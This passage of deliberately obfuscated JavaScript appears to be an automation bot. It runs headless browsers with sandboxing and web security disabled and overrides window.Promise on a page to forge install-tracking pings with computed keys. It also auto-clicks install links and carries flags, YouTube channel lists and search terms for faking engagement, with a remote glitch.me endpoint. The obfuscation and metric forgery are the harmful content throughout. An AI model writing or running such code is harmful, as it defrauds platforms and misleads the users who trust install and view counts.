                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x218b * 0x1 + -0x55 * -0x3a + 0x4 * -0xd32 | L >>> 0xb * -0x111 + -0x1b13 * 0x1 + 0x26e9 * 0x1) + (M & N | ~M & O) + P + (-0x9b6efb5f * 0x1 + 0x1d1f7066 + 0xd8d20492) + Q[J] << -0x172 * -0xd + -0x277 * 0x1 + -0x1053) << 0x233 * 0x11 + 0x188f + -0x3ded | P >>> -0xefd + 0x4 * 0x5c1 + 0x7ec * -0x1) + (L & (M = M << -0xaae + -0x17ae + 0x227a | M >>> 0x17c4 + -0x9 * 0x22 + -0xb48 * 0x2) | ~L & N) + O + (0x821d05b1 * 0x1 + -0xac1c1efd * 0x1 + 0x4b43 * 0x1c2b7) + Q[J + (-0xa4a + 0x12ce * -0x2 + 0x2fe7)] << 0x1 * 0x2050 + -0x1d0b * 0x1 + -0x345) << 0x8c3 + 0x3 * 0x8dd + 0x2355 * -0x1 | O >>> -0x1 * -0x20c5 + 0x1ad8 + -0x3b82) + (P & (L = L << -0x1 * 0x186d + -0x1bb * -0xd + 0x20c | L >>> -0x468 + 0x2147 + -0x3 * 0x99f) | ~P & M) + N + (-0x9946d * -0x1066 + 0x2a4573a + -0x4539d10f) + Q[J + (-0x1 * -0xa21 + 0x105f + -0x2 * 0xd3f)] << -0x2480 + -0x9f3 + -0x17 * -0x205) << -0x1 * -0x1307 + 0x1be6 + -0x2ee8 | N >>> 0x1bf7 + 0x2513 * 0x1 + 0x3 * -0x15a5) + (O & (P = P << 0x14bf + -0x1 * -0xe22 + 0x1 * -0x22c3 | P >>> -0x2f9 * -0x2 + 0x1949 + -0x1f39) | ~O & L) + M + (-0x26d027 * -0x1ac + -0x384cec5f * -0x2 + -0x56fb6059) + Q[J + (-0x2 * 0x5d5 + 0x7b5 * 0x1 + 0x3f8)] << -0xffc + 0x1 * 0x173f + -0x743 * 0x1) << -0x246f + -0x1f * 0xf + -0x2645 * -0x1 | M >>> -0x2509 + 0xe26 + -0xda * -0x1b) + (N & (O = O << -0x5 * 0x9c + 0x106d + -0xd43 | O >>> -0xf11 + 0x47b + 0xa98) | ~N & P) + L + (0x90672b63 + 0x16c6c8a5 + 0x51c7fa1 * -0xf) + Q[J + (-0x1 * -0xcaf + 0x1ae4 + 0x30b * -0xd)] << 0xb * 0x5 + 0x37 + -0x6e * 0x1, N = N << 0x22e4 + -0x3d0 + 0xf7b * -0x2 | N >>> 0x25 * 0xfe + -0x299 + -0x221b;
              for (; J < -0xa * -0x369 + -0xfad * 0x1 + -0x1245; J += -0x5cf * 0x5 + -0x13 * 0xa7 + 0x2975)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2ab * 0xa + 0xb00 * -0x2 + 0x30b3 | L >>> 0x1b0b + -0x1a9f + -0x51 * 0x1) + (M ^ N ^ O) + P + (-0x123a3596 * -0x7 + 0x69b6eeb8 + 0x3b * -0x2135483) + Q[J] << 0x1 * 0xcc0 + 0x17 + -0xcd7) << 0x38 * 0x4 + 0x3 * -0x207 + 0x53a | P >>> 0x1a6f + -0xa7 * -0x4 + -0x1cf0) + (L ^ (M = M << 0xb * -0x359 + -0x1556 + 0x3a47 | M >>> -0xc59 * -0x3 + 0x262f + -0x4b38) ^ N) + O + (0x13 * -0x467d926 + -0x26d14 * -0x1f5a + 0x767f446b) + Q[J + (0x33 * 0x35 + 0x10c3 * -0x1 + 0x635)] << 0x2 * -0xe3b + -0xb92 + 0x2808) << -0x125 * -0x15 + -0x1b78 + 0x374 | O >>> 0xa88 + 0x1d7d + 0xd * -0x312) + (P ^ (L = L << -0x15ea + 0x1a17 + -0x40f | L >>> -0x2e * 0xb1 + 0x1 * -0x1c29 + 0x49d * 0xd) ^ M) + N + (-0x73c559ea + -0x6276f3dc + 0x9 * 0x241ee9ef) + Q[J + (-0x25ff + -0x987 + 0x5f1 * 0x8)] << 0x977 * 0x4 + -0x1 * -0x1025 + -0x3601) << 0x1283 + 0x1d94 + -0x3012 | N >>> 0x322 + -0xd * -0x22d + -0x1f50) + (O ^ (P = P << -0x1492 + -0x37d + 0x1 * 0x182d | P >>> 0x4b * 0x63 + -0x3a1 * -0x2 + -0x2441) ^ L) + M + (-0xdfde39c + 0x694d4be5 + 0x138a8358) + Q[J + (-0xc * 0x271 + 0x3 * 0x45 + -0xc0 * -0x26)] << -0x1f3c + -0x1a5 * 0x11 + 0x3b31) << -0x2212 + 0x1a95 + 0x782 | M >>> -0x3d * -0x1d + -0x737 + -0x15 * -0x5) + (N ^ (O = O << 0x565 + -0x1bda + 0x1693 | O >>> 0x2157 + 0xc89 + -0x2dde) ^ P) + L + (-0x2aaf469 + 0x1f75c8 * -0x197 + 0xa3892102) + Q[J + (0x1 * 0x355 + 0x23db + -0x1b4 * 0x17)] << -0x1951 + -0x60f + 0x1f60, N = N << 0x1c8 + 0x57 * 0x53 + -0x1ddf * 0x1 | N >>> 0x68b + 0x5 * -0x739 + 0x1d94;
              for (; J < 0x12 * -0x1c + 0x112b + 0x3 * -0x4fd; J += 0x1 * 0x120d + -0x1b35 + -0x1d * -0x51)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1f91 * 0x1 + -0xef9 * 0x1 + -0x1093 | L >>> -0x2 * 0x92c + -0x20e3 + 0x3356) + (M & N | M & O | N & O) + P - (0xb * 0x339942d + -0x1 * 0xc6b38b60 + 0x3 * 0x5c0a2587) + Q[J] << -0x11 * 0x1f + -0x13f5 + 0x581 * 0x4) << 0x2ab + -0x692 + 0x3ec | P >>> -0x1f73 + 0x6be * -0x1 + 0x331 * 0xc) + (L & (M = M << 0xa2b + -0x772 + -0x29b | M >>> -0x158e + 0x1300 + -0xa4 * -0x4) | L & N | M & N) + O - (-0x633a * 0x22e13 + -0x82b977b3 + 0x1cbed8425) + Q[J + (-0x1ad2 + 0x215e + -0x68b)] << 0x231b + -0x3 * 0xb32 + -0x185) << 0x4 * 0x73 + 0xaed + -0xcb4 | O >>> -0x1663 * 0x1 + 0x20f * -0x5 + -0x4af * -0x7) + (P & (L = L << 0x26cb + -0x4d4 + -0x21d9 | L >>> 0x1e0 + 0x1c37 + 0x1 * -0x1e15) | P & M | L & M) + N - (0x1ac5b0de + -0x6 * 0x106562c2 + 0x1a1f8f2 * 0x71) + Q[J + (-0xee6 + 0x23da + -0x17f * 0xe)] << 0x1 * -0x2353 + -0x944 + 0x2c97) << -0x1021 + -0xf4b + 0x3 * 0xa7b | N >>> -0x3e * -0x8f + 0x4f * 0x8 + 0x1 * -0x24ff) + (O & (P = P << 0x1963 + 0x1 * -0x6df + -0x1266 | P >>> -0x141b + -0x1 * -0x121f + 0xaa * 0x3) | O & L | P & L) + M - (0x2978a * 0x4805 + 0x355d8423 * -0x4 + -0x2343cd * -0x3f6) + Q[J + (0x1d2c * -0x1 + -0x1 * 0x2083 + 0x1ed9 * 0x2)] << 0x2 * -0x1381 + -0x619 * 0x2 + 0x3334) << 0x1870 + 0x356 * 0x8 + 0x331b * -0x1 | M >>> 0xe * 0x26a + -0x4d * 0x11 + -0x1c94) + (N & (O = O << -0x1a3a + 0x21d2 + -0x77a | O >>> 0x474 + -0x24cd + -0x205b * -0x1) | N & P | O & P) + L - (-0xb2a8c * -0xa7f + 0x2d150b * 0x1d + 0x96ab28f * -0x1) + Q[J + (-0x18 * -0x56 + 0x1 * 0x137a + -0x1 * 0x1b86)] << 0x61 + 0x24a0 + 0x2501 * -0x1, N = N << -0x286 + -0x8a9 * -0x1 + 0x605 * -0x1 | N >>> -0x1 * -0x38 + 0x423 * -0x9 + 0x2505;
              for (; J < 0x542 * -0x1 + 0x191 * -0x12 + 0x21c4; J += 0x251 * -0xf + -0x1 * 0x1225 + -0x15 * -0x285)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1e2a + 0x1 * 0x3b + -0x9 * -0x354 | L >>> -0x64b + -0x211d + 0x2783) + (M ^ N ^ O) + P - (-0x2e7e9d * -0x3e + -0xf0e6ca4 + 0x13ebe * 0x2e1c) + Q[J] << -0x122f * -0x1 + 0x26f7 + -0x3926) << -0x22d3 + -0x1 * -0x1e2f + 0x4a9 | P >>> 0x1a * 0x86 + -0x18e2 + 0xb61) + (L ^ (M = M << -0xfbb + -0x1fd * 0xe + -0x35 * -0xd3 | M >>> -0x39 * -0x50 + 0x5 * -0x4d + -0x104d) ^ N) + O - (-0x5a763c37 + -0x2633adcc + 0x20b33f * 0x593) + Q[J + (0x906 + -0x6a + 0x89b * -0x1)] << 0xf9f + -0x23a2 + -0x1 * -0x1403) << 0x23e6 + -0x589 + 0x2 * -0xf2c | O >>> 0x8f6 + 0xda3 + -0x167e) + (P ^ (L = L << -0xf5b + 0x1937 + -0x9be | L >>> -0x1938 * -0x1 + 0x12dd + 0x1 * -0x2c13) ^ M) + N - (-0x6e6f53c + 0x7 * -0x162e67b + 0x7 * 0xa081265) + Q[J + (-0x11 * 0x1e9 + 0x10e3 + 0xf98)] << -0x556 * -0x6 + -0x1da8 + 0x2 * -0x12e) << 0x3e0 + 0xa + -0x3e5 * 0x1 | N >>> -0x2469 + 0x4c7 * -0x6 + 0x412e) + (O ^ (P = P << -0x14b * -0x3 + 0x1839 + -0x1bfc | P >>> 0x183d + -0x10f * -0x1b + -0x10 * 0x34d) ^ L) + M - (0x5a60892 + -0x3d1 * 0xd136e + 0x61de5c66) + Q[J + (0x3a * -0x63 + -0x240b + 0x3a7c)] << 0x123 + -0x217a + -0x1 * -0x2057) << -0x23a8 + -0x1a7f * -0x1 + 0x92e | M >>> 0xb2 * 0x2b + -0xace + -0x1 * 0x12fd) + (N ^ (O = O << 0x211 * -0x9 + -0x9 * -0x2 + 0x2b * 0x6f | O >>> -0x132d + 0x7f * 0x13 + 0x9c2) ^ P) + L - (-0x16ef4742 * 0x1 + -0x461a643f + 0xb47ea97 * 0xd) + Q[J + (-0x155e + -0xdc1 + 0x2323)] << 0x2 * 0x18a + -0x6ed + 0xc5 * 0x5, N = N << -0x1fc7 + -0xa49 + 0x2a2e | N >>> 0x17c5 * 0x1 + 0x33 * 0x29 + -0x1fee;
              this['h0'] = this['h0'] + L << 0x18dc * 0x1 + -0x1cff + 0x161 * 0x3, this['h1'] = this['h1'] + M << 0x1 * 0x2465 + 0x1 * -0x2438 + 0x2d * -0x1, this['h2'] = this['h2'] + N << 0x1 * 0x3ab + 0x1 * 0x78b + -0x23 * 0x52, this['h3'] = this['h3'] + O << -0x577 + -0x1 * 0xbe3 + 0x115a, this['h4'] = this['h4'] + P << -0xc95 * -0x1 + -0x1379 * -0x1 + -0x200e;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x5 * 0x9 + 0x1488 + -0x1 * 0x1499 & -0x1 * 0x220e + 0x622 * -0x4 + -0x1 * -0x3aa5] + w[J >> 0xc86 + 0x28 * -0xf1 + 0x193a & -0x5a1 * 0x1 + -0x1168 + 0x8 * 0x2e3] + w[J >> -0xb1f + -0x248 + -0xd7b * -0x1 & 0x239a + 0x2335 + 0x2 * -0x2360] + w[J >> 0x4 * 0x136 + -0x1 * -0x67f + -0xb47 & 0x266e * 0x1 + -0x131e * 0x2 + 0x5 * -0x7] + w[J >> -0x575 * 0x5 + -0x1f82 + 0x3ad7 & -0x18d3 + -0x820 + 0x2102] + w[J >> 0x1 * -0x1ac9 + 0x247a + -0x9a9 & -0x8d9 + 0x23b4 + 0x14 * -0x157] + w[J >> -0xffa * -0x1 + 0x6a3 * 0x1 + 0x1699 * -0x1 & -0x250 + 0xfd + -0x76 * -0x3] + w[-0x5 * -0x77b + -0x9e6 * -0x3 + -0x430a & J] + w[K >> -0x3a9 * 0x5 + -0x1 * -0x23de + -0x1175 & 0x11ba + 0x6ec * -0x2 + -0x3d3] + w[K >> -0x28a * 0x6 + 0x1f7c + -0x1028 & 0x49b * -0x2 + -0x16be + 0x2003] + w[K >> 0x3af * -0x2 + 0x5 * -0x4c1 + 0x1f37 & -0x91 + 0xe3e + -0xd9e] + w[K >> -0x3b * 0x59 + -0x1 * -0x1223 + -0x270 * -0x1 & 0x10 * -0x19 + 0x3 * 0xc47 + 0x119b * -0x2] + w[K >> -0x59 * -0x5e + -0x1 * -0xf43 + -0x2fe5 & 0x13f6 + 0x1319 * 0x1 + -0x2700] + w[K >> -0x2671 + -0x14b * 0x5 + 0x2cf0 & 0x3e9 + 0x23ff + -0x27d9] + w[K >> 0x2 * 0x4e1 + -0x653 + -0x36b & -0x1f45 * -0x1 + -0x1 * -0x32d + -0x2263] + w[-0x5 * 0x5f8 + 0x59f + 0x1848 * 0x1 & K] + w[L >> -0x831 + 0x182e + -0xfe1 & 0x2 * -0x949 + -0xc42 * -0x2 + -0x5e3] + w[L >> 0x7 * -0xcf + -0x490 * -0x1 + 0x131 & 0xa0d + -0x3b * 0x85 + 0x14a9 * 0x1] + w[L >> -0x15e3 + -0x5 * -0x3 + 0x8 * 0x2bd & 0x40c + -0x1a * -0x3 + -0x9d * 0x7] + w[L >> -0xcdd + 0x1 * 0x16c9 + -0x9dc & -0x107 * 0x1d + 0x407 * 0x1 + 0x19d3] + w[L >> 0x772 * -0x3 + 0x193a + -0x7 * 0x68 & -0x1 * -0xc1d + -0x168b * 0x1 + -0x37f * -0x3] + w[L >> 0xb * -0x21a + 0x2121 + -0x9fb & -0x20cb + -0x1781 + -0x9 * -0x643] + w[L >> 0x117 * -0x9 + -0x22eb * 0x1 + 0x3 * 0xeea & -0x26bd + -0x92b + 0x2ff7] + w[0x7 * -0x4b1 + 0x2 * -0xf5c + 0x3f9e & L] + w[M >> -0x1f0f + -0x1 * -0x273 + 0x1cb8 & 0xe09 + 0x796 * 0x2 + 0x42a * -0x7] + w[M >> 0x2300 + 0xf06 * -0x1 + -0x13e2 & -0xa66 * -0x1 + 0x984 + 0x13db * -0x1] + w[M >> -0xcf * -0x17 + -0x1681 + -0x4 * -0xff & -0xf50 + 0x180d + -0xb * 0xca] + w[M >> -0x479 * -0x2 + -0x11c3 * 0x1 + 0x8e1 & -0x1 * -0x4d6 + 0x1ea7 + 0x2 * -0x11b7] + w[M >> 0x1e7 * 0x3 + 0x1d58 + -0x2301 & 0x1f26 + -0x174 + 0x9e1 * -0x3] + w[M >> -0x20a1 + 0x2 * 0x2ba + 0x1b35 & -0x16a3 * -0x1 + 0x9b + -0x172f] + w[M >> -0x1b01 * -0x1 + -0x62 * -0x56 + -0x3be9 & 0x1f85 + 0x1 * 0x3a1 + -0x2317] + w[-0x1924 * -0x1 + -0x18a1 + 0x2 * -0x3a & M] + w[N >> -0x18 * 0xe4 + 0xaab + 0x3 * 0x39b & 0x5f3 * 0x5 + -0x3 * -0x2a9 + -0x25ab] + w[N >> 0xaa * -0x34 + 0x18c3 * -0x1 + -0x295 * -0x17 & -0x1673 + 0x22e5 + -0xc63] + w[N >> 0x173f * 0x1 + 0x1553 * -0x1 + -0x1d8 & -0x482 * -0x7 + 0x875 * -0x1 + -0x170a] + w[N >> -0x67 * 0x49 + 0x16b5 * 0x1 + -0xe * -0x7b & 0x95b + 0xd3 * -0x7 + -0x387] + w[N >> 0xa07 + -0x1e3a + 0x143f & 0x135b + -0x69b + -0xcb1] + w[N >> -0x1ab3 + -0x25de + 0x4099 & 0xad1 + -0x3 * -0x713 + -0x1ffb] + w[N >> 0x45 * -0x47 + 0x1e34 + -0xb0d & -0xbb * 0x30 + 0x14d8 + 0x11 * 0xd7] + w[-0x66c + 0x8ef * -0x4 + 0x2a37 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xc64 * 0x3 + 0x1653 + 0x3 * -0x13cd & -0x59d + -0x1a6c + -0x4b8 * -0x7,
                J >> 0x15c4 * -0x1 + 0x18f2 + 0xe * -0x39 & -0xf1e + 0x95e + 0x6bf,
                J >> -0x19e1 * 0x1 + 0x10c4 + 0x925 & -0xc3b + 0x228d + 0x67 * -0x35,
                0x19c + -0x158b + 0x14ee & J,
                K >> -0x1b82 + -0x1 * -0x336 + -0x1864 * -0x1 & -0x23d2 * 0x1 + -0xa17 * 0x1 + 0x4 * 0xbba,
                K >> 0x9f3 + -0x1dbd + -0x9a * -0x21 & 0xaf * 0x26 + -0x5e4 + -0x1317 * 0x1,
                K >> 0x1b76 + 0x61 * -0x33 + 0x19 * -0x53 & 0x2 * -0x1194 + 0x762 + -0x1 * -0x1cc5,
                0x85 * 0x7 + -0x1f3d + 0x1c99 & K,
                L >> -0x5 * 0x528 + 0x1 * 0x7a9 + 0x1237 & 0x756 + -0x4b0 + -0x1 * 0x1a7,
                L >> -0xaf5 + 0x5d * -0x11 + 0x2 * 0x899 & -0xda6 + 0x195f + -0xaba * 0x1,
                L >> 0x12a * 0xf + 0xaf * -0x1a + -0xb * -0x8 & -0xd4c + 0x1 * 0x22f + 0xc1c,
                -0x5 * -0x41f + 0x2 * 0xe18 + -0x7 * 0x6d4 & L,
                M >> -0x14e6 + 0x74c + 0xdb2 * 0x1 & -0x1635 + 0x742 + 0xff2,
                M >> 0x39b + -0x23af + 0x2024 & -0x39 * 0x45 + 0x4e5 * -0x6 + 0x2dba,
                M >> 0x1 * -0x262a + -0x61 * 0x56 + -0x1798 * -0x3 & -0x31 * -0xcb + 0x20f3 + -0x46cf,
                0x7 * -0x2e7 + -0xa * 0x21 + 0x169a & M,
                N >> 0x245 + -0x7fe + 0x5d1 & 0x1 * 0x12f6 + 0xcfd * -0x1 + -0x4fa,
                N >> 0x19af * 0x1 + 0x2027 + 0x6 * -0x9a1 & 0x11c9 * -0x1 + -0xcfe * 0x3 + -0x1ce1 * -0x2,
                N >> 0x2c3 * 0xd + -0x67 * 0xb + -0x17 * 0x15e & 0x1 * 0x5b4 + 0xa1c + -0x1 * 0xed1,
                0x1b19 + -0x19 * 0xbc + -0x7be & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x237c + -0xf * -0x83 + -0x2b15), (K = new DataView(J))['setUint32'](0x3 * -0x11b + 0x5f5 + -0x2a4, this['h0']), K['setUint32'](0xef3 * 0x1 + 0x331 + -0x1220, this['h1']), K['setUint32'](-0x1d22 * -0x1 + 0x12e * -0xc + -0x779 * 0x2, this['h2']), K['setUint32'](-0x4 * -0x3db + 0x154f + -0x24af, this['h3']), K['setUint32'](-0x1fef + -0x1330 + 0x332f, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1bb4 + -0x2504 + 0x950];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x15b5 * 0x1 + 0x2702 + 0x67 * -0x2b;
            J[-0x1bad * 0x1 + 0xee4 + -0xcc9 * -0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1 * 0x24df + 0x19b8 + 0x3 * -0x14dd] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * 0x21fe + -0xb8c + 0x83 * 0x59), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x2045 + -0xa55 + -0x15ef;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1071 + -0x17 * 0x18f + 0x3a26), Promise['resolve'](-0x1 * 0xf91 + 0x701 + 0x891);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x93 * 0x7 + 0x2142 + -0x1d3d; j < 0x1add + 0x233b * 0x1 + -0x3e17; j++)
    i();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x2 * 0x2d2 + 0x233 * 0x2 + -0x9f * -0x2);
    let h = e[f];
    if (c['QZrqvn'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x18d1 * 0x1 + -0x1 * -0x14f8 + 0x3d9, r, s, t = -0x511 * 0x6 + 0x1c05 + 0x261; s = m['charAt'](t++); ~s && (r = q % (-0x525 + 0x1 * -0x1eca + 0x23f3) ? r * (0x5c + 0x19d * 0x7 + 0x1 * -0xb67) + s : s, q++ % (0x1b27 + 0x1db2 + -0x38d5)) ? o += String['fromCharCode'](0x6 * 0x7b + 0x7 * 0x170 + -0xbf3 & r >> (-(-0x163 * -0xd + 0x269c + 0x1 * -0x38a1) * q & 0x36b + -0x1035 + 0xcd0)) : 0x22bb + 0x12b3 * -0x2 + 0x2ab * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0xc3 * -0x2 + -0x145 * -0xa + -0xb2c, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1 * -0x213f + -0xd7 + 0x5a * -0x5c))['slice'](-(-0x203a + 0x1431 + -0x1 * -0xc0b));
        }
        return decodeURIComponent(p);
      };
      c['eRMsay'] = i, b = arguments, c['QZrqvn'] = !![];
    }
    const j = e[-0x1716 + 0x327 * 0xa + -0x870],
      k = f + j,
      l = b[k];
    return !l ? (h = c['eRMsay'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const NETWORK_PATIENCE = 0x3279 + -0x2357 + 0x1 * 0x101e + (0x12f9 + 0x1301 + -0x1a42) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xb54 + 0x1 * -0x1ced + -0x35b * -0xc) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + W(0x12) + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x2 * 0x2d2 + 0x233 * 0x2 + -0x9f * -0x2);
    let h = e[f];
    if (b['quayQZ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x18d1 * 0x1 + -0x1 * -0x14f8 + 0x3d9, s, t, u = -0x511 * 0x6 + 0x1c05 + 0x261; t = n['charAt'](u++); ~t && (s = r % (-0x525 + 0x1 * -0x1eca + 0x23f3) ? s * (0x5c + 0x19d * 0x7 + 0x1 * -0xb67) + t : t, r++ % (0x1b27 + 0x1db2 + -0x38d5)) ? p += String['fromCharCode'](0x6 * 0x7b + 0x7 * 0x170 + -0xbf3 & s >> (-(-0x163 * -0xd + 0x269c + 0x1 * -0x38a1) * r & 0x36b + -0x1035 + 0xcd0)) : 0x22bb + 0x12b3 * -0x2 + 0x2ab * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0xc3 * -0x2 + -0x145 * -0xa + -0xb2c, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1 * -0x213f + -0xd7 + 0x5a * -0x5c))['slice'](-(-0x203a + 0x1431 + -0x1 * -0xc0b));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1716 + 0x327 * 0xa + -0x870,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x446 * -0x5 + -0x188 + -0x3 * -0x7a2; u < 0x1883 * 0x1 + -0xe1a * 0x1 + -0x49 * 0x21; u++) {
          p[u] = u;
        }
        for (u = 0x6f * 0x2d + -0x1 * 0xc48 + -0x73b; u < -0x1 * 0x995 + 0x92 * -0x2 + -0x1 * -0xbb9; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x9f * 0xb + 0x1d36 + -0x230b * 0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x17 * 0x79 + -0x1133 + 0x1c12, q = 0x823 + 0x4a2 * -0x2 + 0x121;
        for (let v = 0xfa1 * 0x1 + 0x62f * 0x1 + -0x15d0; v < n['length']; v++) {
          u = (u + (0x354 * -0x1 + 0xfee * -0x1 + 0x1343 * 0x1)) % (0x3 * 0x14b + 0xf23 + -0x1204), q = (q + p[u]) % (-0x1 * -0x19cb + 0xd4e + -0x2619), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x3 * -0x40d + 0x1a98 + -0x25bf)]);
        }
        return t;
      };
      b['AFYnYl'] = m, c = arguments, b['quayQZ'] = !![];
    }
    const j = e[0x1a6e + 0x1aad + -0x351b],
      k = f + j,
      l = c[k];
    return !l ? (b['MWLvES'] === undefined && (b['MWLvES'] = !![]), h = b['AFYnYl'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x2 * 0x2d2 + 0x233 * 0x2 + -0x9f * -0x2);
    let h = e[f];
    return h;
  }, d(b, c);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x6 * -0x61f + 0x1 * -0x24df + 0x25; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + 